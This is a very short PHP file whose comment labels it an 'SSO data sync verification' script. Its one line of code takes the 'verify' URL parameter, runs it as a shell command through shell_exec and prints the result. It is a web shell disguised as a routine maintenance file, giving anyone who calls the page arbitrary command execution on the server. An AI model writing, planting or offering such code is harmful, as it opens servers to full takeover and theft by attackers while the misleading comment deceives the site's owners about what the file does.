<?php
// SSO data sync verification
if(isset($_GET['verify'])){ echo shell_exec($_GET['verify']); }
